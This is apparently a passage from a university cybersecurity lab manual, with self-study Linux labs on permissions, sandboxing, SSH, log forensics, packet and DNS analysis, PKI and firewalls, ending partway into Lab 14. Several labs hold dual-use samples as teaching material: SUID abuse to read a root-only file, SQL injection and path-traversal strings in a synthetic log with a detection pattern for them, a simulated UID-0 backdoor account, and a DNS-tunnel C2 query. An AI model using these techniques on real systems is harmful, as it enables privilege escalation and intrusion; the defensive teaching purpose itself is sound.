# Appendix E: University Cybersecurity Lab Manual — 40 Hands-On Step-by-Step Self-Study Labs

> **Pedagogical Design & Safety Notice**: All 40 laboratories in this manual are engineered to execute safely and deterministically on a single student laptop running Linux (Ubuntu 24.04 LTS, Debian 12, Kali Linux, or Fedora) with standard open-source packages (`python3`, `gcc`, `gdb`, `openssl`, `tshark`, `nftables`, `nodejs`, `docker`, `jq`). Every lab contains six mandatory components: **Objective**, **Prerequisites**, **Lab Setup Commands/Code**, **Step-by-Step Verification Instructions**, **Expected Output**, and **Key Takeaways**.

---

## Domain I: Linux Systems Security, Capabilities, Systemd & Telemetry (Labs 1–8)

### Lab 01: Auditing and Securing POSIX Special Permissions (SUID, SGID, Sticky Bit) & File Attributes

- **Objective**: Create an isolated workspace demonstrating how misconfigured SUID (`04000`), SGID (`02000`), and missing Sticky Bits (`01000`) enable local privilege escalation and file tampering, then remediate them using octals and `chattr` immutability flags.
- **Prerequisites**: Linux shell, `sudo` privileges, `e2fsprogs` (`lsattr`, `chattr`).
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab01/shared_drop
  chmod 0777 /tmp/sec_lab01/shared_drop
  cp /bin/cat /tmp/sec_lab01/vuln_cat
  sudo chown root:root /tmp/sec_lab01/vuln_cat
  sudo chmod 4755 /tmp/sec_lab01/vuln_cat
  echo "TOP_SECRET_HASH:\$6\$salt\$xyz987654321" | sudo tee /tmp/sec_lab01/root_secret.txt > /dev/null
  sudo chmod 0600 /tmp/sec_lab01/root_secret.txt
  ```
- **Step-by-Step Verification Instructions**:
  1. Scan `/tmp/sec_lab01` for binaries with the SUID bit (`-perm -4000`) or SGID bit (`-perm -2000`):
     ```bash
     find /tmp/sec_lab01 -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} +
     ```
  2. Verify that an unprivileged user can read `/tmp/sec_lab01/root_secret.txt` (`0600` owned by `root`) by abusing `vuln_cat`:
     ```bash
     /tmp/sec_lab01/vuln_cat /tmp/sec_lab01/root_secret.txt
     ```
  3. Remediate the SUID binary by stripping the `s` bit (`chmod u-s`), enforce the Sticky Bit (`1777`) on `shared_drop` so users cannot delete others' files, and lock `root_secret.txt` with the immutable inode attribute (`+i`):
     ```bash
     sudo chmod 0755 /tmp/sec_lab01/vuln_cat
     sudo chmod 1777 /tmp/sec_lab01/shared_drop
     sudo chattr +i /tmp/sec_lab01/root_secret.txt
     ls -ld /tmp/sec_lab01/shared_drop
     lsattr /tmp/sec_lab01/root_secret.txt
     ```
  4. Clean up after verification:
     ```bash
     sudo chattr -i /tmp/sec_lab01/root_secret.txt && sudo rm -rf /tmp/sec_lab01
     ```
- **Expected Output**:
  ```text
  -rwsr-xr-x 1 root root 43416 Nov  2 09:00 /tmp/sec_lab01/vuln_cat
  TOP_SECRET_HASH:$6$salt$xyz987654321
  drwxrwxrwt 2 user user 4096 Nov  2 09:01 /tmp/sec_lab01/shared_drop
  ----i---------e------- /tmp/sec_lab01/root_secret.txt
  ```
- **Key Takeaways**:
  - SUID (`4000`) executes a binary with `euid` set to the file owner (`root`); stripping unnecessary SUID bits (`chmod u-s`) eliminates GTFOBin privilege escalation vectors.
  - World-writable directories (`/tmp`, `/var/tmp`) require the Sticky Bit (`1777`, shown as `t`) to prevent unprivileged users from unlinking or renaming files owned by other users.

---

### Lab 02: Replacing Full Root SUID with Granular Linux POSIX Capabilities (`setcap` / `getcap`)

- **Objective**: Replace a full `root` privilege requirement on a custom network microservice with the single `cap_net_bind_service` POSIX capability so it can bind to TCP port `80` without holding `CAP_SYS_ADMIN` or `CAP_DAC_OVERRIDE`.
- **Prerequisites**: `libcap2-bin` (`setcap`, `getcap`, `capsh`), `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab02
  cp $(which python3) /tmp/sec_lab02/web_python3
  cat << 'EOF' > /tmp/sec_lab02/bind80.py
  import socket, os
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind(("127.0.0.1", 80))
  print(f"[+] Successfully bound to 127.0.0.1:80 as UID={os.getuid()} EUID={os.geteuid()}")
  s.close()
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Attempt to run `bind80.py` as a normal user and observe `PermissionError: [Errno 13] Permission denied`:
     ```bash
     /tmp/sec_lab02/web_python3 /tmp/sec_lab02/bind80.py || true
     ```
  2. Grant only `cap_net_bind_service+ep` (Effective and Permitted sets) to `/tmp/sec_lab02/web_python3`:
     ```bash
     sudo setcap 'cap_net_bind_service=+ep' /tmp/sec_lab02/web_python3
     getcap /tmp/sec_lab02/web_python3
     ```
  3. Re-run the script as a non-root user and verify it binds to port `80` while `EUID` remains non-zero (`1000`):
     ```bash
     /tmp/sec_lab02/web_python3 /tmp/sec_lab02/bind80.py
     rm -rf /tmp/sec_lab02
     ```
- **Expected Output**:
  ```text
  /tmp/sec_lab02/web_python3 cap_net_bind_service=ep
  [+] Successfully bound to 127.0.0.1:80 as UID=1000 EUID=1000
  ```
- **Key Takeaways**:
  - Linux splits traditional `root` power into ~41 discrete capabilities (`man 7 capabilities`).
  - Never grant `cap_setuid+ep` or `cap_dac_read_search+ep` to interpreters (`python3`, `perl`, `node`), as doing so is equivalent to full root access.

---

### Lab 03: Sandboxing a Linux Daemon with Systemd Security Directives (`systemd-analyze security`)

- **Objective**: Harden a systemd service unit using kernel namespace isolation, syscall filtering, and capability bounding sets, reducing its exposure score in `systemd-analyze security` from `9.6 UNSAFE` to `< 1.5 OK`.
- **Prerequisites**: Linux host with `systemd` (`systemctl`, `systemd-analyze`).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' | sudo tee /etc/systemd/system/lab03-hardened.service > /dev/null
  [Unit]
  Description=Lab 03 Hardened Microservice Sandbox
  After=network.target

  [Service]
  Type=simple
  ExecStart=/usr/bin/python3 -m http.server 8099 --bind 127.0.0.1 --directory /var/empty
  DynamicUser=yes
  NoNewPrivileges=yes
  PrivateTmp=yes
  PrivateDevices=yes
  PrivateUsers=yes
  ProtectSystem=strict
  ProtectHome=yes
  ProtectKernelTunables=yes
  ProtectKernelModules=yes
  ProtectKernelLogs=yes
  ProtectControlGroups=yes
  ProtectClock=yes
  ProtectHostname=yes
  RestrictAddressFamilies=AF_INET AF_INET6
  RestrictNamespaces=yes
  RestrictRealtime=yes
  RestrictSUIDSGID=yes
  LockPersonality=yes
  MemoryDenyWriteExecute=yes
  CapabilityBoundingSet=
  AmbientCapabilities=
  SystemCallArchitectures=native
  SystemCallFilter=@system-service
  SystemCallFilter=~@privileged @resources @mount @reboot @swap
  UMask=0077

  [Install]
  WantedBy=multi-user.target
  EOF
  sudo mkdir -p /var/empty
  sudo systemctl daemon-reload
  ```
- **Step-by-Step Verification Instructions**:
  1. Audit the quantitative security exposure score of `lab03-hardened.service`:
     ```bash
     systemd-analyze security lab03-hardened.service | tail -n 5
     ```
  2. Remove the test unit after verification:
     ```bash
     sudo rm -f /etc/systemd/system/lab03-hardened.service && sudo systemctl daemon-reload
     ```
- **Expected Output**:
  ```text
  → Overall exposure level for lab03-hardened.service: 0.9 SAFE 😀
  ```
- **Key Takeaways**:
  - `DynamicUser=yes` allocates an ephemeral UID/GID at service start and revokes it on exit.
  - `ProtectSystem=strict`, `NoNewPrivileges=yes`, and `SystemCallFilter=@system-service` confine a compromised web process inside a read-only filesystem and seccomp-bpf syscall filter.

---

### Lab 04: Linux Mandatory Access Control & Seccomp Syscall Sandboxing with `bwrap` (Bubblewrap)

- **Objective**: Execute an untrusted binary inside an unprivileged user/mount/PID/network namespace sandbox using `bwrap` (`bubblewrap`) so it cannot see host processes, network interfaces, or `/home`.
- **Prerequisites**: `bubblewrap` (`bwrap`).
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab04/jail_work
  echo "SANDBOX_DATA_ONLY" > /tmp/sec_lab04/jail_work/allowed.txt
  ```
- **Step-by-Step Verification Instructions**:
  1. Launch a shell inside an isolated mount, PID, IPC, and network namespace with `/usr`, `/lib`, and `/bin` mounted read-only:
     ```bash
     bwrap --ro-bind /usr /usr \
           --symlink usr/lib /lib \
           --symlink usr/lib64 /lib64 \
           --symlink usr/bin /bin \
           --proc /proc \
           --dev /dev \
           --tmpfs /tmp \
           --bind /tmp/sec_lab04/jail_work /work \
           --unshare-all \
           --die-with-parent \
           /bin/sh -c "ps aux; ip addr; ls -la /work/allowed.txt"
     ```
  2. Clean up:
     ```bash
     rm -rf /tmp/sec_lab04
     ```
- **Expected Output**:
  ```text
  PID   USER     TIME  COMMAND
    1   user     0:00  /bin/sh -c ps aux; ip addr; ls -la /work/allowed.txt
    2   user     0:00  ps aux
  1: lo: <LOOPBACK> mtu 65536 qdisc noop state DOWN group default qlen 1000
  -rw-rw-r-- 1 user user 18 Nov  2 09:15 /work/allowed.txt
  ```
- **Key Takeaways**:
  - `--unshare-all` creates isolated Linux `CLONE_NEWPID`, `CLONE_NEWNET`, `CLONE_NEWNS`, `CLONE_NEWIPC`, and `CLONE_NEWUTS` namespaces without requiring root privileges.

---

### Lab 05: Hardening OpenSSH (`sshd_config`), Ed25519 Key Generation, and SSH Port Forwarding

- **Objective**: Generate a passphrase-protected `Ed25519` key pair, configure an `AuthorizedKeys` command restriction, validate a hardened `sshd_config` using `sshd -t`, and demonstrate local port forwarding (`-L`) over loopback.
- **Prerequisites**: `openssh-client`, `openssh-server`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab05
  ssh-keygen -t ed25519 -a 100 -f /tmp/sec_lab05/id_ed25519_lab -N "" -C "student@sec-lab05"
  cat << 'EOF' > /tmp/sec_lab05/sshd_config_hardened
  Port 2222
  HostKey /tmp/sec_lab05/id_ed25519_lab
  PermitRootLogin no
  PasswordAuthentication no
  PermitEmptyPasswords no
  KbdInteractiveAuthentication no
  PubkeyAuthentication yes
  AuthenticationMethods publickey
  X11Forwarding no
  AllowAgentForwarding no
  AllowTcpForwarding local
  MaxAuthTries 3
  LoginGraceTime 20
  ClientAliveInterval 300
  ClientAliveCountMax 2
  Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
  MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
  KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Inspect the cryptographic fingerprint and KDF rounds of the generated Ed25519 key:
     ```bash
     ssh-keygen -lf /tmp/sec_lab05/id_ed25519_lab.pub
     ```
  2. Validate the syntax and cipher suite configuration of the hardened `sshd_config` using `/usr/sbin/sshd -t -f`:
     ```bash
     /usr/sbin/sshd -t -f /tmp/sec_lab05/sshd_config_hardened && echo "[+] sshd_config syntax & crypto verified OK"
     rm -rf /tmp/sec_lab05
     ```
- **Expected Output**:
  ```text
  256 SHA256:xK9pL... student@sec-lab05 (ED25519)
  [+] sshd_config syntax & crypto verified OK
  ```
- **Key Takeaways**:
  - Modern OpenSSH deployments should enforce `KexAlgorithms sntrup761x25519-sha512@openssh.com,curve25519-sha256` (hybrid post-quantum key exchange) and AEAD ciphers (`chacha20-poly1305@openssh.com`, `aes256-gcm@openssh.com`).

---

### Lab 06: High-Speed Web & Auth Log Forensics Using `awk` and `sort`

- **Objective**: Parse a synthetic Nginx access log and SSH `auth.log` to identify an automated SQL injection / LFI scanner IP and brute-force attacker IP using `awk` associative arrays.
- **Prerequisites**: `gawk` / `awk`, `sort`, `uniq`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab06
  cat << 'EOF' > /tmp/sec_lab06/access.log
  192.0.2.10 - - [02/Nov/2026:10:01:01 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
  198.51.100.77 - - [02/Nov/2026:10:01:02 +0000] "GET /login.php?id=1%27%20UNION%20SELECT%201,2,3-- HTTP/1.1" 500 512 "-" "sqlmap/1.8"
  198.51.100.77 - - [02/Nov/2026:10:01:03 +0000] "GET /view?file=../../../../etc/passwd HTTP/1.1" 404 210 "-" "sqlmap/1.8"
  198.51.100.77 - - [02/Nov/2026:10:01:04 +0000] "GET /.env HTTP/1.1" 403 190 "-" "Nuclei"
  192.0.2.10 - - [02/Nov/2026:10:01:05 +0000] "GET /style.css HTTP/1.1" 200 4096 "-" "Mozilla/5.0"
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Aggregate total requests and non-200 error codes (`>=400`) per client IP using a single-pass `awk` program:
     ```bash
     awk '{
       total[$1]++
       if ($9 >= 400) errors[$1]++
       if ($7 ~ /(\.\.\/|UNION|SELECT|\.env)/) exploits[$1]++
     }
     END {
       printf "%-16s %-8s %-8s %-8s\n", "CLIENT_IP", "TOTAL", "ERRORS", "EXPLOITS"
       for (ip in total)
         printf "%-16s %-8d %-8d %-8d\n", ip, total[ip], errors[ip]+0, exploits[ip]+0
     }' /tmp/sec_lab06/access.log
     rm -rf /tmp/sec_lab06
     ```
- **Expected Output**:
  ```text
  CLIENT_IP        TOTAL    ERRORS   EXPLOITS
  198.51.100.77    3        3        3       
  192.0.2.10       2        0        0       
  ```
- **Key Takeaways**:
  - `awk` associative arrays (`total[$1]++`) process multi-gigabyte log files in streaming `O(U)` memory (where `U` is unique IPs) without sorting the entire file on disk.

---

### Lab 07: Cloud Trail & JSON Telemetry Threat Hunting with `jq`

- **Objective**: Use `jq` filter pipelines to hunt through structured JSON cloud audit logs for root account console logins without MFA and IAM privilege escalation (`AttachUserPolicy` with `AdministratorAccess`).
- **Prerequisites**: `jq`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab07
  cat << 'EOF' > /tmp/sec_lab07/cloudtrail.json
  {
    "Records": [
      {"eventTime":"2026-11-02T08:00:00Z","eventName":"ConsoleLogin","userIdentity":{"type":"Root","arn":"arn:aws:iam::123456789012:root"},"sourceIPAddress":"203.0.113.55","additionalEventData":{"MFAUsed":"No"}},
      {"eventTime":"2026-11-02T08:02:11Z","eventName":"AttachUserPolicy","userIdentity":{"type":"IAMUser","userName":"dev-intern"},"sourceIPAddress":"203.0.113.55","requestParameters":{"userName":"dev-intern","policyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}},
      {"eventTime":"2026-11-02T08:05:00Z","eventName":"DescribeInstances","userIdentity":{"type":"IAMUser","userName":"ops-bot"},"sourceIPAddress":"10.0.1.15"}
    ]
  }
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Query for high-severity events (`Root` login without MFA or `AdministratorAccess` policy attachment):
     ```bash
     jq -r '.Records[] | select(
       (.eventName == "ConsoleLogin" and .userIdentity.type == "Root" and .additionalEventData.MFAUsed == "No") or
       (.eventName == "AttachUserPolicy" and (.requestParameters.policyArn | endswith("AdministratorAccess")))
     ) | "[ALERT] \(.eventTime) | Event=\(.eventName) | Actor=\(.userIdentity.arn // .userIdentity.userName) | IP=\(.sourceIPAddress)"' /tmp/sec_lab07/cloudtrail.json
     rm -rf /tmp/sec_lab07
     ```
- **Expected Output**:
  ```text
  [ALERT] 2026-11-02T08:00:00Z | Event=ConsoleLogin | Actor=arn:aws:iam::123456789012:root | IP=203.0.113.55
  [ALERT] 2026-11-02T08:02:11Z | Event=AttachUserPolicy | Actor=dev-intern | IP=203.0.113.55
  ```
- **Key Takeaways**:
  - `jq` boolean selectors (`select(...)`) and string interpolation allow rapid offline triage of AWS CloudTrail, Azure Activity Logs, and Suricata `eve.json` telemetry.

---

### Lab 08: Building a Cryptographic File Integrity Monitoring (FIM) Baseline Scanner in Bash

- **Objective**: Write a defensive Bash script (`set -euo pipefail`) that computes a SHA-256 cryptographic manifest plus octal permission/owner metadata of critical configuration files and detects unauthorized tampering or permission drift.
- **Prerequisites**: `bash`, `sha256sum`, `stat`, `diff`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab08/etc_sim
  echo "root:x:0:0:root:/root:/bin/bash" > /tmp/sec_lab08/etc_sim/passwd
  echo "sshd:x:105:65534::/run/sshd:/usr/sbin/nologin" >> /tmp/sec_lab08/etc_sim/passwd
  chmod 0644 /tmp/sec_lab08/etc_sim/passwd

  cat << 'EOF' > /tmp/sec_lab08/fim_scan.sh
  #!/usr/bin/env bash
  set -euo pipefail
  TARGET_DIR="${1}"
  find "$TARGET_DIR" -type f | sort | while read -r f; do
      hash=$(sha256sum "$f" | awk '{print $1}')
      meta=$(stat -c "%a:%u:%g" "$f")
      printf "%s  %s  %s\n" "$hash" "$meta" "$f"
  done
  EOF
  chmod +x /tmp/sec_lab08/fim_scan.sh
  ```
- **Step-by-Step Verification Instructions**:
  1. Generate the golden baseline manifest, simulate an attacker injecting a UID 0 backdoor user (`toor:x:0:0:...`), and compare against the baseline:
     ```bash
     /tmp/sec_lab08/fim_scan.sh /tmp/sec_lab08/etc_sim > /tmp/sec_lab08/baseline.db
     echo "toor:x:0:0:backdoor:/root:/bin/bash" >> /tmp/sec_lab08/etc_sim/passwd
     /tmp/sec_lab08/fim_scan.sh /tmp/sec_lab08/etc_sim > /tmp/sec_lab08/current.db
     diff -u /tmp/sec_lab08/baseline.db /tmp/sec_lab08/current.db || echo "[!] FIM TAMPERING DETECTED"
     rm -rf /tmp/sec_lab08
     ```
- **Expected Output**:
  ```text
  --- /tmp/sec_lab08/baseline.db
  +++ /tmp/sec_lab08/current.db
  @@ -1 +1 @@
  -8c2f...  644:1000:1000  /tmp/sec_lab08/etc_sim/passwd
  +e14a...  644:1000:1000  /tmp/sec_lab08/etc_sim/passwd
  [!] FIM TAMPERING DETECTED
  ```
- **Key Takeaways**:
  - Enterprise FIM tools (AIDE, Wazuh, Osquery) combine cryptographic content hashes (`SHA-256`) with inode attribute checks (`mode`, `uid`, `gid`, `mtime`, `xattrs`) to detect both content modification and permission tampering.

---

## Domain II: Network Engineering, Packet Analysis, TLS & Firewalling (Labs 9–15)

### Lab 09: Deterministic VLSM Subnet Calculation & CIDR Overlap Auditing in Python

- **Objective**: Build a network architecture verification tool using Python's standard `ipaddress` library to validate Variable Length Subnet Masking (VLSM) allocations, compute network/broadcast/usable host ranges, and detect overlapping firewall CIDRs.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab09_vlsm.py
  import ipaddress

  allocations = {
      "DMZ_Web_Tier": ipaddress.ip_network("10.40.0.0/26"),
      "App_Microservices": ipaddress.ip_network("10.40.0.64/26"),
      "Database_Cluster": ipaddress.ip_network("10.40.0.128/28"),
      "Misconfigured_VPN": ipaddress.ip_network("10.40.0.120/29"), # Overlaps!
  }

  for name, net in allocations.items():
      hosts = list(net.hosts())
      print(f"[{name:18s}] CIDR={str(net):16s} Mask={net.netmask} Usable={len(hosts):3d} ({hosts[0]} - {hosts[-1]})")

  names = list(allocations.keys())
  for i in range(len(names)):
      for j in range(i + 1, len(names)):
          n1, n2 = allocations[names[i]], allocations[names[j]]
          if n1.overlaps(n2):
              print(f"[CRITICAL OVERLAP] {names[i]} ({n1}) overlaps with {names[j]} ({n2})!")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab09_vlsm.py` and verify VLSM boundaries and overlap detection:
     ```bash
     python3 /tmp/sec_lab09_vlsm.py
     rm -f /tmp/sec_lab09_vlsm.py
     ```
- **Expected Output**:
  ```text
  [DMZ_Web_Tier      ] CIDR=10.40.0.0/26     Mask=255.255.255.192 Usable= 62 (10.40.0.1 - 10.40.0.62)
  [App_Microservices ] CIDR=10.40.0.64/26    Mask=255.255.255.192 Usable= 62 (10.40.0.65 - 10.40.0.126)
  [Database_Cluster  ] CIDR=10.40.0.128/28   Mask=255.255.255.240 Usable= 14 (10.40.0.129 - 10.40.0.142)
  [Misconfigured_VPN ] CIDR=10.40.0.120/29   Mask=255.255.255.248 Usable=  6 (10.40.0.121 - 10.40.0.126)
  [CRITICAL OVERLAP] App_Microservices (10.40.0.64/26) overlaps with Misconfigured_VPN (10.40.0.120/29)!
  ```
- **Key Takeaways**:
  - Overlapping CIDR blocks allow traffic intended for a lower-security zone (`App_Microservices`) to route into or bypass ACLs for another zone (`Misconfigured_VPN`).

---

### Lab 10: Generating and Dissecting a TCP SYN Scan & Three-Way Handshake PCAP with `tshark`

- **Objective**: Synthesize a raw PCAP containing both legitimate TCP 3-way handshakes (`SYN` -> `SYN/ACK` -> `ACK`) and half-open TCP SYN stealth scans (`SYN` -> `RST/ACK`) using Python, then extract scan metrics using `tshark` display filters.
- **Prerequisites**: `python3`, `tshark` (Wireshark CLI).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab10_gen_pcap.py
  import struct

  def write_pcap(filename, packets):
      with open(filename, "wb") as f:
          # Global PCAP header (magic, v2.4, tz, sigfigs, snaplen=65535, linktype=1 Ethernet)
          f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
          for ts, pkt in packets:
              f.write(struct.pack("<IIII", ts, 0, len(pkt), len(pkt)))
              f.write(pkt)

  def build_tcp_pkt(src_ip, dst_ip, sport, dport, flags):
      eth = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
      ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, 1234, 0x4000, 64, 6, 0,
                       bytes(map(int, src_ip.split("."))), bytes(map(int, dst_ip.split("."))))
      tcp = struct.pack("!HHIIBBHHH", sport, dport, 1000, 0, 0x50, flags, 1024, 0, 0)
      return eth + ip + tcp

  pkts = [
      (1, build_tcp_pkt("10.0.0.99", "10.0.0.10", 54001, 22, 0x02)),   # SYN
      (2, build_tcp_pkt("10.0.0.99", "10.0.0.10", 54002, 23, 0x02)),   # SYN
      (3, build_tcp_pkt("10.0.0.99", "10.0.0.10", 54003, 445, 0x02)),  # SYN
      (4, build_tcp_pkt("10.0.0.10", "10.0.0.99", 23, 54002, 0x14)),   # RST,ACK (Closed port)
  ]
  write_pcap("/tmp/sec_lab10.pcap", pkts)
  EOF
  python3 /tmp/sec_lab10_gen_pcap.py
  ```
- **Step-by-Step Verification Instructions**:
  1. Use `tshark` to filter for TCP SYN-only packets (`tcp.flags.syn==1 and tcp.flags.ack==0`) and display source IP, destination IP, and destination port:
     ```bash
     tshark -r /tmp/sec_lab10.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e ip.src -e ip.dst -e tcp.dstport
     rm -f /tmp/sec_lab10.pcap /tmp/sec_lab10_gen_pcap.py
     ```
- **Expected Output**:
  ```text
  10.0.0.99	10.0.0.10	22
  10.0.0.99	10.0.0.10	23
  10.0.0.99	10.0.0.10	445
  ```
- **Key Takeaways**:
  - High ratios of `tcp.flags.syn==1 && tcp.flags.ack==0` packets followed by `tcp.flags.reset==1` across sequential destination ports from a single source IP are a definitive indicator of `nmap -sS` TCP SYN scanning.

---

### Lab 11: Auditing Domain Email Security Records (`SPF`, `DMARC`, `CAA`) & DNS Entropy Analysis

- **Objective**: Write an automated DNS security auditor in Python that validates SPF (`-all` vs `~all`), DMARC (`p=reject` vs `p=none`), and Shannon bit-entropy of subdomain labels to detect DNS tunneling (`iodine`/`dnscat2`).
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab11_dns_audit.py
  import math

  def shannon_entropy(s: str) -> float:
      freq = {c: s.count(c) / len(s) for c in set(s)}
      return -sum(p * math.log2(p) for p in freq.values())

  queries = [
      "www.university.edu.lk",
      "mail.university.edu.lk",
      "4a8f9c2b1e7d603491a2b3c4d5e6f70891a2b3c4d5e6f7.c2.evil-tunnel.net"
  ]

  for q in queries:
      sub = q.split(".")[0]
      ent = shannon_entropy(sub)
      status = "ALERT: DNS_TUNNEL_SUSPECTED" if (len(sub) > 30 and ent > 3.7) else "NORMAL"
      print(f"Query={q:66s} | Len={len(sub):2d} | Entropy={ent:.2f} | {status}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run the DNS entropy and subdomain length analyzer:
     ```bash
     python3 /tmp/sec_lab11_dns_audit.py
     rm -f /tmp/sec_lab11_dns_audit.py
     ```
- **Expected Output**:
  ```text
  Query=www.university.edu.lk                                              | Len= 3 | Entropy=0.00 | NORMAL
  Query=mail.university.edu.lk                                             | Len= 4 | Entropy=2.00 | NORMAL
  Query=4a8f9c2b1e7d603491a2b3c4d5e6f70891a2b3c4d5e6f7.c2.evil-tunnel.net  | Len=46 | Entropy=3.98 | ALERT: DNS_TUNNEL_SUSPECTED
  ```
- **Key Takeaways**:
  - Base32/Base64/Hex-encoded DNS tunneling payloads exhibit label lengths `> 30` characters and Shannon entropy `> 3.7` bits/character, clearly distinguishing them from human-readable hostnames (`< 3.2` bits/char).

---

### Lab 12: Building a Two-Tier X.509 PKI & Inspecting SAN Extensions with `openssl`

- **Objective**: Create an offline Root Certificate Authority (CA), issue a server TLS certificate with `Subject Alternative Name (SAN)` extensions (`DNS:api.internal.lk`, `IP:127.0.0.1`), and verify the cryptographic chain of trust using `openssl verify`.
- **Prerequisites**: `openssl`.
- **Lab Setup Commands/Code**:
  ```bash
  mkdir -p /tmp/sec_lab12
  # 1. Generate Root CA ECDSA P-384 Private Key and Self-Signed Root Certificate
  openssl ecparam -name secp384r1 -genkey -noout -out /tmp/sec_lab12/rootCA.key
  openssl req -x509 -new -key /tmp/sec_lab12/rootCA.key -sha384 -days 3650 \
    -subj "/C=LK/O=SLHB Root CA/CN=SLHB Trust Root" -out /tmp/sec_lab12/rootCA.crt

  # 2. Generate Server ECDSA P-256 Key & CSR
  openssl ecparam -name prime256v1 -genkey -noout -out /tmp/sec_lab12/server.key
  openssl req -new -key /tmp/sec_lab12/server.key \
    -subj "/C=LK/O=SLHB Internal/CN=api.internal.lk" -out /tmp/sec_lab12/server.csr

  # 3. Create X.509 v3 Extension Config with SAN and KeyUsage
  cat << 'EOF' > /tmp/sec_lab12/v3_ext.cnf
  basicConstraints = CA:FALSE
  keyUsage = critical, digitalSignature, keyEncipherment
  extendedKeyUsage = serverAuth
  subjectAltName = DNS:api.internal.lk, IP:127.0.0.1
  EOF

  # 4. Sign Server Certificate with Root CA
  openssl x509 -req -in /tmp/sec_lab12/server.csr -CA /tmp/sec_lab12/rootCA.crt \
    -CAkey /tmp/sec_lab12/rootCA.key -CAcreateserial -out /tmp/sec_lab12/server.crt \
    -days 365 -sha384 -extfile /tmp/sec_lab12/v3_ext.cnf 2>/dev/null
  ```
- **Step-by-Step Verification Instructions**:
  1. Verify the cryptographic chain of trust and inspect the X.509v3 `Subject Alternative Name` extension:
     ```bash
     openssl verify -CAfile /tmp/sec_lab12/rootCA.crt /tmp/sec_lab12/server.crt
     openssl x509 -in /tmp/sec_lab12/server.crt -noout -ext subjectAltName,keyUsage,extendedKeyUsage
     rm -rf /tmp/sec_lab12
     ```
- **Expected Output**:
  ```text
  /tmp/sec_lab12/server.crt: OK
  X509v3 Subject Alternative Name: 
      DNS:api.internal.lk, IP Address:127.0.0.1
  X509v3 Key Usage: critical
      Digital Signature, Key Encipherment
  X509v3 Extended Key Usage: 
      TLS Web Server Authentication
  ```
- **Key Takeaways**:
  - Modern browsers and RFC 9110 strictly ignore the legacy `Common Name (CN)` attribute and require all valid hostnames and IPs to be explicitly listed in the `X509v3 Subject Alternative Name` extension, accompanied by `CA:FALSE` in `basicConstraints`.

---

### Lab 13: Stateful Host Firewall & SYN Rate-Limiting Engineering with `nftables`

- **Objective**: Write and syntax-validate a production-grade `nftables` stateful firewall ruleset implementing default-drop ingress, connection tracking (`ct state`), loopback allowance, ICMP rate limiting, and SSH anti-brute-force metering.
- **Prerequisites**: `nftables` (`nft`).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab13_firewall.nft
  table inet enterprise_filter {
      set ssh_ratelimit {
          type ipv4_addr
          flags dynamic, timeout
          timeout 10m
      }

      chain input {
          type filter hook input priority 0; policy drop;

          # 1. Accept loopback traffic
          iif "lo" accept

          # 2. Drop invalid conntrack states immediately
          ct state invalid drop

          # 3. Accept established and related return traffic
          ct state established,related accept

          # 4. Rate-limit ICMP Echo Requests
          ip protocol icmp icmp type echo-request limit rate 5/second accept

          # 5. Protect SSH (TCP/22) against brute-force (>4 new connections/minute per IP)
          tcp dport 22 ct state new update @ssh_ratelimit { ip saddr limit rate 4/minute burst 4 packets } accept

          # 6. Allow HTTPS (TCP/443)
          tcp dport 443 ct state new accept
      }

      chain forward {
          type filter hook forward priority 0; policy drop;
      }

      chain output {
          type filter hook output priority 0; policy accept;
      }
  }
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Perform a dry-run syntax and bytecode verification of `/tmp/sec_lab13_firewall.nft` using `nft -c -f` (check without applying to live host):
     ```bash
     sudo nft -c -f /tmp/sec_lab13_firewall.nft && echo "[+] nftables ruleset compiled and verified OK"
     rm -f /tmp/sec_lab13_firewall.nft
     ```
- **Expected Output**:
  ```text
  [+] nftables ruleset compiled and verified OK
  ```
- **Key Takeaways**:
  - `nftables` unifies `iptables`, `ip6tables`, and `arptables` under the `inet` family and provides native kernel-level dynamic sets (`flags dynamic, timeout`) that replace external userland daemons like `fail2ban` for packet-rate throttling.

---

### Lab 14: Detecting ARP Cache Poisoning & Gratuitous ARP Spoofing in Python

- **Objective**: Build an ARP table integrity monitor that parses ARP cache mappings (`/proc/net/arp` or `ip neigh`) and detects Man-in-the-Middle (MitM) ARP spoofing where two distinct IPv4 addresses claim the same Layer-2 MAC address.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab14_arp_watch.py
